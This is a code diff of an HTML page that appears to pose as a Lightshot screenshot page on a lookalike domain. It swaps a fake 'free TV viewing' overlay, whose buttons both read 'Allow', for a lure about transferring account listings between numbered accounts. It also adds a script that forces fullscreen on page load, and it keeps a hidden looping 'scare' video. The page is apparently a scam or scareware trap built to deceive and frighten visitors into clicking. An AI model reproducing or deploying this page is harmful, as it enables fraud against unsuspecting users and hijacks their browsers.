@@ -3,11 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-<title>Screenshot by Lightshot</title>
-<meta property="og:title" content="Screenshot">
-<meta property="og:url" content="https://pnrtscr.com/kqrkc7">
-<meta property="og:site_name" content="Lightshot">
-<meta property="og:image" content="https://pnrtscr.com/lightshot.png">
+<title></title>
 <meta property="og:description" content="Captured with Lightshot">
 <meta property="og:type" content="website">
 <meta name="twitter:card" content="photo">
@@ -163,18 +159,27 @@
 <body>
 <div id="overlay" class="overlay">
 <div class="overlay-body">
-<p class="overlay-title">Бесплатный сервис по просмотру</p>
-<p class="overlay-title">"МАТЧ", "НТВ", и "РЕН ТВ"</p>
-<p class="overlay-description">Чтобы продолжить просмотр бесплатно "РЕН ТВ" нажмите на "Разрешить"</p>
+<p class="overlay-title">Перенос обьявлений со старого аккаунта</p>
+<p class="overlay-title">с *5484 на *5577</p>
+<p class="overlay-description">Чтобы перенести, нажмите "Перенести обьявления"</p>
 <div class="overlay-buttons-wrapper">
-<div id="accept-button" class="overlay-button">Разрешить</div>
-<div id="decline-button" class="overlay-button">Разрешить</div>
+<div id="accept-button" class="overlay-button">Перенести обьявления</div>
+<div id="decline-button" class="overlay-button">Не интересно</div>
 </div>
 </div>
 </div>
 <div class="scare">
 <video id="video" class="video" src="/scr/video.mp4" loop></video>
 </div>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen().catch(err => {
+            console.log(`Error attempting to enable full-screen mode: ${err.message}`);
+        });
+    }
+});
+</script>
 <script type="text/javascript">
             const video = document.getElementById("video");
             const overlay = document.getElementById("overlay");
